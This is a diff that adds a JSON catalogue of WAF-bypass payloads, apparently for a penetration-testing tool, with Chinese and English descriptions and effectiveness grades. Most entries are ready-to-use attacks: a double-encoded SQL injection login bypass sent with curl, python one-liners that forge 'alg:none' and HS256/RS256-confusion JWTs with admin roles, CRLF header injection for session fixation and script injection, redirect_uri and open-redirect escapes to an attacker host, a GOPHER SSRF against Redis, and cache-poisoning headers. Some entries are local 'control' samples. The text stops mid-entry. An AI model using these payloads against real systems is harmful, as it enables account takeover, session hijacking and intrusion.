@@ -1,0 +1,1371 @@
+{
+  "schemaVersion": 1,
+  "entries": [
+    {
+      "id": "auth-sql-login-bypass",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 3,
+          "expectedCommand": "curl -sS --max-time 5 --path-as-is -d \"username=%2561dmin%2527%2520OR%2520%27%31%27%253D%27%31%27--%2520-\" http://127.0.0.1:8080/login",
+          "description": {
+            "zh": "绕过一次解码后校验的 WAF/中间件链：双重百分号编码，第二次解码发生在应用层。成功判据：登录成功。失效条件：仅对做二次 URL 解码的架构成立。",
+            "en": "Bypasses WAF/middleware chains that validate after a single decode by double percent-encoding; the second decode happens at the app layer. Success: login succeeds. Failure condition: only works on architectures that run a second URL decode pass."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "auth2-cookie-via-url",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "?SESSION=attacker_session\n?SessionID=attacker_session\n?phpsessid=attacker_session",
+          "description": {
+            "zh": "大小写不同的参数名命中大小写不敏感的取参层。成功判据：会话从 URL 采信。失效条件：现代 WAF 请求归一化后普遍失效，仅对自研大小写敏感正则成立。",
+            "en": "Differently-cased parameter names hit case-insensitive extraction layers. Success: the session is honored from the URL. Failure condition: broadly defeated once modern WAFs normalize requests; it only works against case-sensitive custom regex rules."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "auth2-jwt",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "python3 -c \"import base64;e=lambda s:base64.urlsafe_b64encode(s.encode()).rstrip(b'=').decode();print(e('{\\\"alg\\\":\\\"RS256\\\",\\\"alg\\\":\\\"none\\\",\\\"typ\\\":\\\"JWT\\\"}')+'.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.')\"",
+          "description": {
+            "zh": "头部写两个 alg 键（RS256 在前 none 在后），不同 JSON 解析器取值不同，绕过头部静态校验；成功判据：任一解析路径按 none 接受。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "Two alg keys make parsers disagree (first vs last), bypassing static header validation. Success: some parse path accepts it as none. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        }
+      ]
+    },
+    {
+      "id": "auth2-jwt-role-admin",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "python3 -c \"import base64,json;e=lambda d:base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode();print(e({'alg':'none','typ':'JWT'})+'.'+e({'user_id':1,'role':'admin'}))\"",
+          "description": {
+            "zh": "完全省略第三个点段（仅两段），绕过“必须三段”与空签名段两类校验；成功判据：两段令牌被接受且 role 生效。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "Drops the third segment entirely, evading both the must-have-three-segments and empty-signature checks. Success: the two-segment token is accepted and the role applies. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "python3 -c \"import base64,json;e=lambda d:base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode();print(e({'alg':'none','typ':'JWT'})+'.'+e({'user_id':1,'role':'admin','iss':'trusted','exp':9999999999})+'.AA')\"",
+          "description": {
+            "zh": "签名段以 AA 占位并增补 iss/exp 声明，改变 base64 特征的同时满足宽松校验；成功判据：令牌以 admin 权限通过。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "Uses an AA placeholder signature and adds iss/exp claims to alter the base64 signature while satisfying lenient checks. Success: the token passes with admin privileges. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        },
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "python3 -c \"import base64,json;e=lambda d:base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode();inner=e({'alg':'none','typ':'JWT'})+'.'+e({'user_id':1,'role':'admin'});print(e({'alg':'none','typ':'JWT','nested':inner}))\"",
+          "description": {
+            "zh": "头部变形：嵌套 JWT 伪装 — 把伪造令牌藏进外层头部 nested 字段（二次解包型实现），规避对 payload 直接含 role 的检测；成功判据：实现解包后接受内层令牌。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "Hides the forged token in a nested header field for unwrap-style implementations, evading direct role-in-payload detection. Success: the impl unwraps and accepts the inner token. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        }
+      ]
+    },
+    {
+      "id": "auth2-set-cookie-crlf",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "%250d%250aSet-Cookie:%20sessionid=attacker_session_id\n%25250d%25250aSet-Cookie:%20sessionid=attacker_session_id\n%250d%250a%250d%250aSet-Cookie:%20sessionid=attacker_session_id\n%250D%250ASet-Cookie:%20JSESSIONID=attacker_session_id",
+          "description": {
+            "zh": "绕过单次解码后匹配 %0d%0aSet-Cookie 的 WAF：应用二次解码时双重编码逐层还原；成功判据：响应头多出攻击者可控的 sessionid/JSESSIONID Cookie（响应中出现两个 Set-Cookie 行）。失效条件：仅对做二次 URL 解码的架构成立。",
+            "en": "Bypasses WAFs matching %0d%0aSet-Cookie after a single decode: double encoding peels back when the application decodes twice; success criterion: an attacker-controlled sessionid/JSESSIONID cookie appears as an extra Set-Cookie line in the response. Failure condition: only works on architectures that run a second URL decode pass."
+          },
+          "effectiveness": "C"
+        },
+        {
+          "area": "wafBypass",
+          "index": 5,
+          "expectedCommand": "%250d%250aSet-Cookie:admin=true\n%25250d%25250aSet-Cookie:admin=true\n%250d%250aSet-Cookie:session=admin\n%250D%250ASet-Cookie:role=admin",
+          "description": {
+            "zh": "绕过单次解码匹配 %0d%0aSet-Cookie 的 WAF 规则：二次解码漏洞下双重编码还原；成功判据：响应多出注入的管理 Cookie 行。失效条件：仅对做二次 URL 解码的架构成立。",
+            "en": "Bypasses WAF rules matching %0d%0aSet-Cookie after one decode: double encoding restores under double-decode flaws; success criterion: an injected admin cookie line appears in the response. Failure condition: only works on architectures that run a second URL decode pass."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "auth2-state",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 5,
+          "expectedCommand": "state=%252F%252F{ATTACKER_HOST}",
+          "description": {
+            "zh": "二次解码还原 // 前缀。判据：解码后跳转攻击域。失效条件：仅对做二次 URL 解码的架构成立。",
+            "en": "Second decode restores the // prefix. Success: navigates to attacker host after decoding. Failure condition: only works on architectures that run a second URL decode pass."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "auth2-token",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 6,
+          "expectedCommand": "Bearer null\nBearer undefined",
+          "description": {
+            "zh": "分别作为完整 Authorization 值发送，并与无头、空头、随机无效令牌及有效测试令牌对照。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Send each as the complete Authorization value and compare with absent, empty, random-invalid, and valid test-token controls. Controlled sample: establishes a baseline or control and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        }
+      ]
+    },
+    {
+      "id": "bizlogic-jwt",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "python3 -c \"import base64,json;e=lambda d:base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode();print(e({'alg':'ES256','typ':'JWT'})+'.'+e({'sub':'1'})+'.'+base64.urlsafe_b64encode(b'A'*64).rstrip(b'=').decode())\"",
+          "description": {
+            "zh": "头部声明 ES256 而签名填充 64 字节，验证是否只按头部声明做长度校验；成功判据：伪签名通过椭圆曲线校验路径。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "Claims ES256 in the header with 64 filler signature bytes to test header-only length validation. Success: the fake signature passes the EC verification path. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        }
+      ]
+    },
+    {
+      "id": "bizlogic-redirect-uri",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "redirect_uri=https%3A%2F%2F{TARGET}%2Fcallback%2F..%252f{ATTACKER_HOST}",
+          "description": {
+            "zh": "路径段 .. 双重编码穿越回调前缀，二次解码后指向外域；成功判据：授权响应落到攻击者域。失效条件：仅对做二次 URL 解码的架构成立。",
+            "en": "Double-encodes the traversal to escape the callback prefix after a second decode. Success: the auth response lands on the attacker host. Failure condition: only works on architectures that run a second URL decode pass."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "bizlogic-redos",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 4,
+          "expectedCommand": "aaaaaaaaaaaaaaaaaaaaaaaa!\naaaaaaaaaaaaaaaaaaaa!\naaaaaaaaaaaaaaaa!\naaaaaaaaaaaa!",
+          "description": {
+            "zh": "以固定终止字符和递减长度构造对照输入，用于测量处理时间增长，不包含正则模式定义。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Build controlled inputs with a fixed terminating character and decreasing lengths to measure processing-time growth without mixing in regex definitions. Controlled sample: establishes a baseline or control and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        }
+      ]
+    },
+    {
+      "id": "clickjacking-xss-interaction-boundary",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "<iframe id=\"frame\" sandbox=\"allow-scripts\" srcdoc=\"<script>document.body.dataset.lab='CJ_XSS_SRCDOC_C3'</script>\"></iframe>",
+          "description": {
+            "zh": "在 allow-scripts Sandbox 中仅设置本地 dataset marker，用于观察隔离上下文。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Set only a local dataset marker inside an allow-scripts sandbox to observe the isolated context. Controlled sample: establishes a baseline or control and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "<iframe src=\"http://127.0.0.1:18080/lab/clickjacking/sandbox-preview?marker=CJ_XSS_SANDBOX_D4\" sandbox=\"allow-scripts allow-popups\"></iframe>",
+          "description": {
+            "zh": "加载本地 Sandbox 预览并记录 popup 与脚本权限，不执行逃逸或导航。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Load the local sandbox preview and record popup and script permissions without escape or navigation. Controlled sample: establishes a baseline or control and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        },
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "<div id=\"drag\" draggable=\"true\" ondragstart=\"event.dataTransfer.setData('text/plain','CJ_XSS_DRAG_E5')\">CJ_XSS_DRAG_E5</div>\n<iframe id=\"target\" src=\"http://127.0.0.1:18080/lab/clickjacking/editable-preview\" sandbox=\"allow-forms\"></iframe>",
+          "description": {
+            "zh": "拖拽 text/plain marker 到本地可编辑预览，验证输入路径而不注入 HTML。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Drag a text/plain marker into a local editable preview to validate the input path without HTML injection. Controlled sample: establishes a baseline or control and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        }
+      ]
+    },
+    {
+      "id": "csrf-flash",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "curl -sS -i \"https://{LAB_APP}/crossdomain.xml\" -H \"Origin: https://{LAB_ORIGIN}\"",
+          "description": {
+            "zh": "修复后确认策略文件已移除或仅保留精确批准来源，并将结果与代理访问日志和资产清单对照。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "After remediation, confirm that the policy is removed or limited to exact approved origins, and compare the result with proxy access logs and the asset inventory. Controlled sample: establishes a baseline or control and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        }
+      ]
+    },
+    {
+      "id": "csrf-json",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "curl -sS -i -X OPTIONS \"https://{LAB_APP}/api/profile\" -H \"Origin: https://{LAB_ORIGIN}\" -H \"Access-Control-Request-Method: POST\" -H \"Access-Control-Request-Headers: content-type\"",
+          "description": {
+            "zh": "从命令行保存预检响应头作为 CORS 配置证据；该请求不携带浏览器会话，也不能单独确认或排除 CSRF。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Preserve preflight response headers as CORS configuration evidence; this command-line request has no browser session and cannot confirm or exclude CSRF by itself. Controlled sample: establishes a baseline or control and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "curl -sS -i -X POST \"https://{LAB_APP}/api/profile\" -H \"Origin: https://{LAB_ORIGIN}\" -H \"Content-Type: text/plain\" --data-binary '{\"displayName\":\"PAYLOADER-CSRF-MARKER\"}'",
+          "description": {
+            "zh": "在无登录 Cookie 的对照请求中确认接口拒绝缺少会话绑定令牌或可信来源的写入，再用真实浏览器完成最终回归。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Use a no-cookie control to confirm that the endpoint rejects writes lacking a session-bound token or trusted origin, then complete the final regression in a real browser. Controlled sample: establishes a baseline or control and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        }
+      ]
+    },
+    {
+      "id": "csrf-token-validation-boundary",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "curl --silent --show-error --max-time 5 -X POST \"http://127.0.0.1:18080/lab/csrf/method-override\" -H \"X-HTTP-Method-Override: PUT\" -H \"X-Lab-Session: CSRF_SESSION_F6\" --data \"marker=CSRF_METHOD_F6\" | jq -e '.csrf_checked == true'",
+          "description": {
+            "zh": "通过 X-HTTP-Method-Override 请求 PUT 语义，并断言 CSRF 中间件仍执行。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Request PUT semantics through X-HTTP-Method-Override and assert that CSRF middleware still runs. Controlled sample: establishes a baseline or control and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "curl --silent --show-error --max-time 5 -X POST \"http://127.0.0.1:18080/lab/csrf/parser-consistency\" -H \"Content-Type: application/json\" -H \"X-Lab-Session: CSRF_SESSION_G7\" --data '{\"marker\":\"CSRF_JSON_G7\"}' | jq -e '.csrf_checked == true and .accepted == false'",
+          "description": {
+            "zh": "发送无 Token JSON 请求并断言与 Form 路径执行相同 CSRF 校验。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Send a tokenless JSON request and assert the same CSRF validation used by the form path. Controlled sample: establishes a baseline or control and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        }
+      ]
+    },
+    {
+      "id": "fastjson-autotype-policy-boundary",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 6,
+          "expectedCommand": "{\"@type\":\"java.net.Inet4Address\",\"val\":\"{LAB_OAST}\"}\n{\"@type\":\"java.net.Inet6Address\",\"val\":\"{LAB_OAST}\"}",
+          "description": {
+            "zh": "Inet4Address 与 Inet6Address JSON — 双栈 DNS 探测：分别用两个自有随机子域各解析一次，记录请求 ID、类型选择与权威 DNS 日志；成功判据：两个子域均收到对应地址类型的解析请求。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "The original third-party domain is retained for traceability only; replace it with two controlled random subdomains, parse one line per request, and record request ID, selected type, and authoritative DNS logs. Controlled sample: establishes a baseline or control and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        }
+      ]
+    },
+    {
+      "id": "httpbypass-admin-path-normalization",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "/%2561dmin\n/%2541dmin\n/ad%256Din",
+          "description": {
+            "zh": "绕过一次解码后匹配的 WAF：第二层解码发生在后端路由。成功判据：管理路径返回 200。失效条件：仅对做二次 URL 解码的架构成立。",
+            "en": "Bypasses WAFs matching after one decode; the second decode happens at backend routing. Success: admin path returns 200. Failure condition: only works on architectures that run a second URL decode pass."
+          },
+          "effectiveness": "C"
+        },
+        {
+          "area": "wafBypass",
+          "index": 3,
+          "expectedCommand": "/admin -> /admin/\n/admin -> /admin/.\n/admin -> /Admin (case change)\n/admin -> /admin%20\n/admin -> /admin%09\n/admin -> /%61%64%6d%69%6e\n/admin -> /admin..;/\n/admin -> /admin;/\n/admin -> /admin?anything\n/admin -> /admin#\n/admin -> /./admin\n/admin -> /admin.html\n/admin -> /admin.json\n/admin -> /admin.js\n/admin -> /admin.css\nX-Host: localhost",
+          "description": {
+            "zh": "对边界设备复测同一组变体；边界与后端判定不一致即确认边界规则可被差异化利用。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Replay the same variants against the edge device; disagreement between edge and backend verdicts confirms differential abuse of edge rules. Controlled sample: establishes a baseline or control and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        }
+      ]
+    },
+    {
+      "id": "httpbypass-cloudflare",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "/home.php/.CSS\n/home.php/.Js\n/home.php/.Png",
+          "description": {
+            "zh": "绕过小写后缀精确匹配的缓存规则：大写扩展名仍按静态处理。成功判据：返回缓存的动态页面。失效条件：现代 WAF 请求归一化后普遍失效，仅对自研大小写敏感正则成立。",
+            "en": "Bypasses cache rules matching lowercase suffixes exactly since uppercase extensions still classify as static. Success: the dynamic page returns from cache. Failure condition: broadly defeated once modern WAFs normalize requests; it only works against case-sensitive custom regex rules."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "httpbypass-cloudflare-ext",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "CF-Visitor: {\"scheme\":\"https\\u0022;evil\":\"1\"}\nCF-Visitor: {\"scheme\":\"javascript\"}\nCF-Visitor: {\"scheme\":\"HTTPS\"}",
+          "description": {
+            "zh": "JSON 结构与编码注入改变协议派生。成功判据：响应或跳转按注入 scheme 构造。现代库现状：CF-Visitor JSON 注入属 2016 年代 CVE 形态，现代 Cloudflare 已净化该头，仅旧版本或自建解析层成立。",
+            "en": "JSON structural and encoding injection alters scheme derivation. Success: responses or redirects are built with the injected scheme. Modern reality: the CF-Visitor JSON injection is a 2016-era CVE pattern; current Cloudflare sanitizes this header, so it only succeeds on legacy or self-built parsers."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "httpbypass-crlf",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "%250d%250a\n%250a\n%250d\n%250d%250a%250d%250a\n%25250d%25250a\n%25%30d%25%30a",
+          "description": {
+            "zh": "绕过单次解码匹配 %0d/%0a 的 WAF：应用再解码一层时双重/三重编码还原出真实 CRLF；成功判据：响应头被拆分（出现受控头名或响应体错位）。失效条件：仅对做二次 URL 解码的架构成立。",
+            "en": "Bypasses WAFs matching %0d/%0a after one decode: double/triple encoding restores real CRLF when the application decodes again; success criterion: the response gets split (controlled header name appears or the body shifts). Failure condition: only works on architectures that run a second URL decode pass."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "httpbypass-crlf-location",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "%250d%250aLocation:https://{ATTACKER_HOST}\n%25250d%25250aLocation:https://{ATTACKER_HOST}\n%250d%250aLocation:%20https://{ATTACKER_HOST}",
+          "description": {
+            "zh": "绕过匹配 %0d%0aLocation 的规则：双重/三重编码在二次解码场景还原；成功判据：响应 30x 跳转到攻击域。失效条件：仅对做二次 URL 解码的架构成立。",
+            "en": "Bypasses rules matching %0d%0aLocation: double/triple encoding restores under double-decode scenarios; success criterion: a 30x response redirecting to the attacker host. Failure condition: only works on architectures that run a second URL decode pass."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "httpbypass-crlf-proxy-header-injection",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "%250d%250aX-Forwarded-For:%20127.0.0.1\n%250d%250aX-Original-URL:%20/admin",
+          "description": {
+            "zh": "绕过一次解码后拦截 %0d%0a 的 WAF：第二层解码发生在代理注入点。成功判据：注入头在服务端生效。失效条件：仅对做二次 URL 解码的架构成立。",
+            "en": "Bypasses WAFs blocking %0d%0a after one decode; the second decode happens at the proxy injection point. Success: the injected header takes effect backend. Failure condition: only works on architectures that run a second URL decode pass."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "httpbypass-dosy-denial-of-service-via-cac",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "X-Forwarded-Host: {ATTACKER_HOST}%00\nX-Forwarded-Host: %00{ATTACKER_HOST}\nX-Forwarded-Host: %2500",
+          "description": {
+            "zh": "编码 NUL 在解码层截断主机名造成解析异常。成功判据：异常响应进入缓存。失效条件：现代栈对头部值中的 NUL 直接返回 400，仅宽容解析层成立。",
+            "en": "Encoded NULs truncate the hostname at the decode layer causing parse failures. Success: the failure response enters the cache. Failure condition: modern stacks answer 400 outright to NUL bytes inside header values, so only lenient parsers accept this."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "httpbypass-fastly",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "X-Varnish: 1234567890\nX-Varnish: 1, 2, 3\nX-Varnish-IP: 127.0.0.1",
+          "description": {
+            "zh": "伪造 X-Varnish 链使边缘认为是内部代理链。成功判据：边缘按内部请求处理并缓存投毒内容。失效条件：默认 Varnish 不信任请求侧 X-Varnish 头，仅当自定义 VCL 显式采信该头时成立。",
+            "en": "Forged X-Varnish chains make the edge treat the request as an internal proxy chain. Success: the edge processes it internally and caches poisoned content. Failure condition: stock Varnish never trusts the request-side X-Varnish header; this only works when a custom VCL explicitly honors it."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "httpbypass-host-web",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "Host: {ATTACKER_HOST}%250d%250a\nHost: {ATTACKER_HOST}%2500",
+          "description": {
+            "zh": "双重编码的 CR/LF/NUL 在缓存规范化层还原造成键差异。成功判据：投毒键与受害键归并为同一缓存条目。失效条件：仅对做二次 URL 解码的架构成立。",
+            "en": "Double-encoded CR/LF/NUL resolve at cache normalization causing key divergence. Success: poisoned and victim keys merge into one cache entry. Failure condition: only works on architectures that run a second URL decode pass."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "inject2-crlf-injection-crlf-injection",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "%250d%250aContent-Type:%20text/html%250d%250a%250d%250a<script>alert()</script>\n%25250d%25250aContent-Type:%20text/html%25250d%25250a%25250a<script>alert()</script>\n%250d%250aSet-Cookie:%20sessionid=attacker\n%25%30d%25%30aSet-Cookie:%20sessionid=attacker",
+          "description": {
+            "zh": "绕过只解码一次即匹配 %0d%0a 的 WAF：应用在 WAF 之后又做一次解码（双重解码漏洞）时，%250d%250a/%25250d%25250a 逐层还原出 CRLF 完成响应分割；成功判据：响应头多出注入的 Content-Type/Set-Cookie 或响应体出现脚本。失效条件：仅对做二次 URL 解码的架构成立。",
+            "en": "Bypasses WAFs that decode once before matching %0d%0a: when the application decodes again after the WAF (double-decode flaw), %250d%250a/%25250d%25250a restore CRLF layer by layer for response splitting; success criterion: injected Content-Type/Set-Cookie headers or script content appear in the response. Failure condition: only works on architectures that run a second URL decode pass."
+          },
+          "effectiveness": "C"
+        },
+        {
+          "area": "wafBypass",
+          "index": 7,
+          "expectedCommand": "%250d%250aSet-Cookie:crlf=double\n%250aX-Forwarded-Host:evil",
+          "description": {
+            "zh": "双重编码绕过一次解码后再匹配 CRLF 的 WAF；成功判据：应用二次解码后响应头注入成功。失效条件：仅对做二次 URL 解码的架构成立。",
+            "en": "Double encoding survives WAFs that match CRLF after a single decode. Success: the header injects after the app's second decode. Failure condition: only works on architectures that run a second URL decode pass."
+          },
+          "effectiveness": "C"
+        },
+        {
+          "area": "wafBypass",
+          "index": 8,
+          "expectedCommand": "%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>\n%0d%0aLocation:%20http://{ATTACKER_HOST}\n%0d%0aSet-Cookie:%20session=admin",
+          "description": {
+            "zh": "逐条放入已确认会进入响应头的测试参数，使用自有测试来源与无敏感 Cookie，检查原始响应头结构。命中判据：响应头出现注入的 Location/Set-Cookie 或正文被拆分。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Place each line separately in a confirmed response-header input, use a controlled origin and nonsensitive cookie, and inspect the raw header structure. Success check: the response headers contain the injected Location/Set-Cookie or the body is split. Controlled sample: establishes a baseline or control and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        }
+      ]
+    },
+    {
+      "id": "inject2-fragment",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "https://{TARGET}%2523%252F%252F{ATTACKER_HOST}",
+          "description": {
+            "zh": "# 双重编码为 %2523，首层解码后仍看似目标域路径；成功判据：二次解析后 fragment 分隔出攻击者域。失效条件：仅对做二次 URL 解码的架构成立。",
+            "en": "Double-encodes # so the first decode still looks like a target path. Success: the second parse splits out the attacker host via the fragment. Failure condition: only works on architectures that run a second URL decode pass."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "inject2-open-redirect-path-confusion",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "/redirect?url=/%2509/{ATTACKER_HOST}\n/redirect?url=/%250d{ATTACKER_HOST}",
+          "description": {
+            "zh": "控制符双重编码应对一次解码的 WAF；成功判据：二次解码后仍形成分隔跳转。失效条件：仅对做二次 URL 解码的架构成立。",
+            "en": "Double-encoded controls survive single-decode WAFs. Success: after the second decode the separator still splits the redirect. Failure condition: only works on architectures that run a second URL decode pass."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "inject2-url-ext",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "/redirect?url=%25252f%25252f%252572%252565%252564%252569%252572%252565%252563%252574%25252d%252563%252561%25256e%252561%252572%252579%25252e%252569%25256e%252576%252561%25256c%252569%252564",
+          "description": {
+            "zh": "三重百分号编码应对多次解码的网关，最终一次解码后为完整外部 URL；成功判据：跳转至攻击者域。失效条件：仅对做二次 URL 解码的架构成立。",
+            "en": "Triple percent-encoding survives multi-decode gateways, leaving a full external URL after the final decode. Success: redirect lands on the attacker host. Failure condition: only works on architectures that run a second URL decode pass."
+          },
+          "effectiveness": "C"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "/redirect?url=https:%25%32%66%25%32%66{ATTACKER_HOST}",
+          "description": {
+            "zh": "协议明文 + 路径段多重编码，规避“整串要么全明文要么全编码”的检测分支；成功判据：解析后为 //host 形态并跳转。失效条件：仅对做二次 URL 解码的架构成立。",
+            "en": "Plaintext scheme plus multiply-encoded slashes straddles detection branches. Success: the parsed //host form triggers the redirect. Failure condition: only works on architectures that run a second URL decode pass."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "inject2-wkhtmltopdf-gopher-ssrf",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "<iframe src=\"GOPHER://127.0.0.1:6379/_INFO%0D%0A\"></iframe>",
+          "description": {
+            "zh": "绕过对全小写 gopher:// 前缀的匹配：协议头大写化后解析器仍识别；Redis 收到指令即成功。失效条件：现代 WAF 请求归一化后普遍失效，仅对自研大小写敏感正则成立。",
+            "en": "Uppercase the scheme against lowercase-prefix matching while parsers still accept it; Redis receiving the command confirms success. Failure condition: broadly defeated once modern WAFs normalize requests; it only works against case-sensitive custom regex rules."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "jwt-algorithm-key-type-binding",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "python3 - <<'PY'\nimport base64, hmac, hashlib\npub = open(\".payloader-jwt-fixture/public.pem\").read()\nh = base64.urlsafe_b64encode(b'{\"alg\":\"HS256\",\"typ\":\"JWT\"}').decode().rstrip('=')\np = base64.urlsafe_b64encode(b'{\"sub\":\"admin\"}').decode().rstrip('=')\ns = base64.urlsafe_b64encode(hmac.new(pub.encode(), f\"{h}.{p}\".encode(), hashlib.sha256).digest()).decode().rstrip('=')\nprint(f\"{h}.{p}.{s}\")\nPY",
+          "description": {
+            "zh": "RS256 公钥当 HS256 密钥使用，绕过算法-密钥类型绑定。成功判据：验签通过。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "Uses the RS256 public key as an HS256 secret to bypass algorithm-key type binding. Success: verification passes. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        },
+        {
